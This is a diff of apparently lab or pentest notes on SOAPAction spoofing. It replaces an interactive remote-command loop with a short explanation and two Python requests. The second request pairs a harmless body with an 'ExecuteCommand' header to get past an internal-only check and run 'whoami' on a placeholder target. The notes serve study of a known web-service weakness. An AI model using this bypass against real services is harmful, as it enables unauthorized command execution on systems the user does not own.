@@ -126,20 +126,59 @@ Definition – Root element containing namespaces, types, messages, operations, 
 
 # SOAPAction Spoofing
 
-```python
+Some SOAP services use the SOAPAction HTTP header to decide which operation to execute — without actually parsing the XML body.
+If the server only checks the SOAPAction header, it may be possible to spoof a restricted operation.
+
+
+## Vulnerable Service
+
+<img width="812" height="572" alt="image" src="https://github.com/user-attachments/assets/e7f6f780-aee8-411c-a6ff-e334957c7d0c" />
+
+**1. Normal Request (Blocked)**
+
 import requests
 
-while True:
-    cmd = input("$ ")
-    payload = f'''<?xml version="1.0" encoding="utf-8"?>
+payload = '''<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
- xmlns:tns="http://tempuri.org/">
+  xmlns:tns="http://tempuri.org/">
+  <soap:Body>
+    <ExecuteCommandRequest xmlns="http://tempuri.org/">
+      <cmd>whoami</cmd>
+    </ExecuteCommandRequest>
+  </soap:Body>
+</soap:Envelope>'''
+
+print(requests.post(
+    "http://<TARGET IP>:3002/wsdl",
+    data=payload,
+    headers={"SOAPAction": '"ExecuteCommand"'}
+).content)
+
+
+Result: "This function is only allowed in internal networks"
+
+**2.Spoofed Request (Bypass)**
+
+We put a harmless operation (LoginRequest) in the body, but keep the SOAPAction as ExecuteCommand.
+
+import requests
+
+payload = '''<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+  xmlns:tns="http://tempuri.org/">
   <soap:Body>
     <LoginRequest xmlns="http://tempuri.org/">
-      <cmd>{cmd}</cmd>
+      <cmd>whoami</cmd>
     </LoginRequest>
   </soap:Body>
 </soap:Envelope>'''
-    print(requests.post("http://<TARGET IP>:3002/wsdl",
-        data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+
+print(requests.post(
+    "http://<TARGET IP>:3002/wsdl",
+    data=payload,
+    headers={"SOAPAction": '"ExecuteCommand"'}
+).content)
+
+
+Result: Command executed successfully — restriction bypassed.
 
